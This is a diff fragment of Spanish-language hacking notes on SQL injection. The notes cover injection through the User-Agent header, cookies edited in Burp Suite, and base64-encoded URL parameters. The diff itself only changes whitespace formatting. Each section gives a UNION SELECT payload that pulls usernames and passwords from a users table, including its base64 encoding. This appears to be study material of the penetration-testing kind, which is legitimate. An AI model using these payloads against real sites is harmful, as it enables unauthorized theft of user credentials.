@@ -12,21 +12,20 @@ Si modifico mi User-Agent en **BURP SUIT** y lo convierto en una consulta SQL pu
 
 **`User-Agent =' UNION SELECT user,password FROM users -- -`**
 
- Asi consigo acceso a las tablas.
+&#x20;Asi consigo acceso a las tablas.
 
 ## **INYECCION SQL MEDIANTE COOKIES**
 
- Hay algunas paginas que comprueban el valor de una cookie y lo compara con una Base de Datos de la Web.
+&#x20;Hay algunas paginas que comprueban el valor de una cookie y lo compara con una Base de Datos de la Web.
 
- Si modifico la Cookie en **BURP SUITE** y la convierto en una consulta SQL, puedo explotar una vulnerabilidad SQL Injection:
+&#x20;Si modifico la Cookie en **BURP SUITE** y la convierto en una consulta SQL, puedo explotar una vulnerabilidad SQL Injection:
 
- **`Cookie =' UNION SELECT user,password FROM users -- -`**
+&#x20;**`Cookie =' UNION SELECT user,password FROM users -- -`**
 
-##  **INYECCION SQL MEDIANTE BASE 64**
+## &#x20;**INYECCION SQL MEDIANTE BASE 64**
 
- En ocasiones la web codificara la URL en base 64 para complicar la Inyeccion SQL. Lo unico que debemos hacer es convertir nuestra Query a Base 64 y la copiamos en el mismo sitio de la URL donde lo pondriamos normalmente.
+&#x20;En ocasiones la web codificara la URL en base 64 para complicar la Inyeccion SQL. Lo unico que debemos hacer es convertir nuestra Query a Base 64 y la copiamos en el mismo sitio de la URL donde lo pondriamos normalmente.
 
- **`' UNION SELECT user,password FROM users -- -`**
+&#x20;** `' UNION SELECT user,password FROM users -- -`**
 
- **`JyBVTklPTiBTRUxFQ1QgdXNlcixwYXNzd29yZCBGUk9NIHVzZXJzIC0tIC0`**
-
+&#x20;**`JyBVTklPTiBTRUxFQ1QgdXNlcixwYXNzd29yZCBGUk9NIHVzZXJzIC0tIC0`**
